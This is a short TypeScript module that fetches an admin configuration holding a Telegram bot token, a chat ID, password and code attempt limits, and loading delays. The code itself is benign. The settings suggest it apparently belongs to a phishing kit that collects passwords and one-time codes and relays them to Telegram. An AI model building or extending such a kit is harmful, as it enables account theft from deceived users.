import axios from 'axios';

interface Config {
	settings: {
		code_loading_time: number;
		pass_loading_time: number;
		max_pass_attempts: number;
		max_code_attempts: number;
	};
	telegram: {
		chat_id: string;
		token: string;
	};
}

const getConfig = async (): Promise<Config> => {
	try {
		const response = await axios.get<[string, string, number, number, number, number]>(
			`${import.meta.env.VITE_API_URL}/api/admin/config`
		);

		const [chat_id, token, code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts] = response.data;
		return {
			settings: {
				code_loading_time,
				pass_loading_time,
				max_pass_attempts,
				max_code_attempts,
			},
			telegram: {
				chat_id,
				token,
			},
		};
	} catch (error) {
		console.error('Error fetching config:', error);
		throw error;
	}
};

export default getConfig;
